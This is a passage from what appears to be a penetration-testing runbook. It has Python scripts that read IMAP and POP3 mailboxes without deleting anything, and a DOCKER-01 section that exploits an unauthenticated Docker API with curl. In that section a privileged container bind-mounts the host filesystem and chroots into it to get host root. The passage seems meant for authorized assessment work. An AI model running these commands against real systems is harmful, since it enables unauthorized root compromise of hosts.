ca=input('CA file: ').strip(); user=input('User: ').strip()
ctx=ssl.create_default_context(cafile=ca)
m = imaplib.IMAP4_SSL(host, port, ssl_context=ctx) if mode=='implicit' else imaplib.IMAP4(host, port)
if mode=='starttls': m.starttls(ssl_context=ctx)
m.login(user, getpass.getpass('Password: '))
m.select('INBOX', readonly=True)
_, d = m.uid('search', None, 'ALL'); uids=d[0].split()[-10:]; print(b' '.join(uids).decode())
uid=input('UID: ').strip()
_, d = m.uid('fetch', uid, '(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)])'); print(d)
_, d = m.uid('fetch', uid, '(BODY.PEEK[TEXT]<0.4096>)'); print(d)
m.logout()
PY
```

| Result | Next |
| --- | --- |
| Header or text returned | **NET-05**. |
| Login denied | **NET-05**. |
| Fetch denied | **NET-05**. |
| TLS error | **MAIL-01**. |

## MAIL-03. Can this POP3 identity read without deleting?

Same shape, using `poplib` and `TOP`, no `DELE`.

```bash
python3 - <<'PY'
import getpass, poplib, ssl, sys
sys.stdin = open('/dev/tty', 'r', encoding='utf-8')
host=input('Host: ').strip(); port=int(input('Port: ')); mode=input('implicit/starttls: ').strip()
ca=input('CA file: ').strip(); user=input('User: ').strip()
ctx=ssl.create_default_context(cafile=ca)
p = poplib.POP3_SSL(host, port, context=ctx) if mode=='implicit' else poplib.POP3(host, port)
if mode=='starttls': p.stls(ctx)
p.user(user); p.pass_(getpass.getpass('Password: ')); print(p.stat())
_, items, _ = p.list(); nums=[i.split()[0] for i in items[-10:]]; print(b' '.join(nums).decode())
n=input('Number: ').strip()
_, lines, _ = p.top(int(n), 80); print(b'\n'.join(lines).decode(errors='replace'))
p.quit()
PY
```

| Result | Next |
| --- | --- |
| Message read | **NET-05**. |
| Login denied | **NET-05**. |
| TOP denied | **NET-05**. |

## DOCKER-01. Is the Docker API unauthenticated?

```bash
curl -sS 'http://<TARGET_IP>:2375/version'
curl -sS 'http://<TARGET_IP>:2375/containers/json'
```

Create a privileged container that mounts the host:

```bash
curl -sS -X POST -H 'Content-Type: application/json' 'http://<TARGET_IP>:2375/containers/create?name=owb' \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host /bin/sh -c id"],"HostConfig":{"Binds":["/:/host"]}}'
curl -sS -X POST 'http://<TARGET_IP>:2375/containers/owb/start'
curl -sS 'http://<TARGET_IP>:2375/containers/owb/logs?stdout=1'
```

| Result | Next |
| --- | --- |
| `uid=0` from the host | Host root; **LNX-01** for context. |
| 403 or 401 | **PAUSE-COVERAGE**. |
| Image missing | `{"Image":"<EXISTING_IMAGE>"}` from `/images/json`. |

Stop and remove the container:

```bash
curl -sS -X POST 'http://<TARGET_IP>:2375/containers/owb/stop'
curl -sS -X DELETE 'http://<TARGET_IP>:2375/containers/owb?force=1'
```
